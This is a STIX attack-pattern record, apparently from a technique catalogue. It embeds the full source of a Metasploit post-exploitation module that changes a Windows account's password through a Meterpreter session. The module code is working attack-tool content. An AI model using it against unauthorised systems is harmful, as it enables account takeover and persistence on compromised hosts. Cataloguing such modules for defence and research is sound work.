{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6d932c50-f32e-4b5e-b796-f726e8922cf9",
    "created": "2024-08-14T16:33:04.984529Z",
    "modified": "2024-08-14T16:33:04.984532Z",
    "name": "Windows Manage Change Password",
    "description": " This module will attempt to change the password of the targeted account. The typical usage is to change a newly created account's password on a remote host to avoid the error, 'System error 1907 has occurred,' which is caused when the account policy enforces a password change before the next login.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/change_password.rb",
            "external_id": "change_password.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Change Password',\n        'Description' => %q{\n          This module will attempt to change the password of the targeted account.\n          The typical usage is to change a newly created account's password on a\n          remote host to avoid the error, 'System error 1907 has occurred,' which\n          is caused when the account policy enforces a password change before the\n          next login.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['Ben Campbell'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('SMBDomain', [false, 'Domain or Host to change password on, if not set will use the current login domain', nil], fallbacks: ['DOMAIN']),\n        OptString.new('SMBUser', [true, 'Username to change password of'], fallbacks: ['PASSWORD']),\n        OptString.new('OLD_PASSWORD', [true, 'Original password' ]),\n        OptString.new('NEW_PASSWORD', [true, 'New password' ]),\n      ]\n    )\n  end\n\n  def run\n    unless client.railgun\n      print_error('This module requires a native Windows payload that supports Railgun.')\n      return\n    end\n\n    domain = datastore['SMBDomain']\n    username = datastore['SMBUser']\n    old_password = datastore['OLD_PASSWORD']\n    new_password = datastore['NEW_PASSWORD']\n    print_status(\"Changing #{domain}\\\\#{username} password to #{new_password}...\")\n    result = client.railgun.netapi32.NetUserChangePassword(\n      domain,\n      username,\n      old_password,\n      new_password\n    )\n\n    case result['return']\n    when 0x05\n      err_msg = 'ERROR_ACCESS_DENIED'\n    when 0x56\n      err_msg = 'ERROR_INVALID_PASSWORD'\n    when 0x92f\n      err_msg = 'NERR_InvalidComputer'\n    when 0x8b2\n      err_msg = 'NERR_NotPrimary'\n    when 0x8ad\n      err_msg = 'NERR_UserNotFound'\n    when 0x8c5\n      err_msg = 'NERR_PasswordTooShort'\n    when 0\n      print_good('Password change successful.')\n    else\n      err_msg = \"unknown error code: #{result['return']}\"\n    end\n\n    if err_msg\n      print_error(\"Password change failed, #{err_msg}.\")\n    end\n  end\nend\n"
}